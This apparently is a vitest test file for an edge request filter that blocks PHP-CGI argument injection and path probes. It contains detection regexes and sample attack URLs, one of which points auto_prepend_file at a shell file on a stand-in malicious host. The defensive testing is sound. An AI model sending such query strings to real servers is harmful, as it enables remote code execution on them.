import { expect, test, describe } from 'vitest';

describe('Ingress Edge Hardening & PHP2Shell Defense', () => {
  // Simulating the fetch handler with mock Request
  const mockFetch = async (url: string) => {
    const request = new Request(url, {
      method: 'GET',
      headers: {
        'Origin': 'https://axim-coding-lab-dashboard.pages.dev',
      }
    });

    const urlObj = new URL(request.url);
    const suspiciousPhpPattern = /(\?-d|auto_prepend_file|auto_append_file|allow_url_include|disable_functions|safe_mode)/i;
    if (suspiciousPhpPattern.test(urlObj.search)) {
      return new Response(JSON.stringify({ error: "Forbidden: Suspicious CGI argument injection detected" }), { status: 403 });
    }

    const pathTraversalPattern = /(\.\.|%2e%2e|\.php|\/wp-admin|\/wp-login\.php|xmlrpc\.php)/i;
    if (pathTraversalPattern.test(urlObj.pathname)) {
      return new Response(JSON.stringify({ error: "Forbidden: Suspicious path probe detected" }), { status: 403 });
    }

    return new Response('OK', { status: 200 });
  };

  test('Rejects PHP CGI argument injection ?-d', async () => {
    const response = await mockFetch('https://example.com/?-d+allow_url_include%3Don');
    expect(response.status).toBe(403);
    const data = await response.json();
    expect(data.error).toContain('Forbidden: Suspicious CGI argument injection detected');
  });

  test('Rejects PHP CGI argument auto_prepend_file', async () => {
    const response = await mockFetch('https://example.com/api?auto_prepend_file=http://malicious.com/shell.txt');
    expect(response.status).toBe(403);
  });

  test('Allows normal requests', async () => {
    const response = await mockFetch('https://example.com/api/v1/health');
    expect(response.status).toBe(200);
  });
});
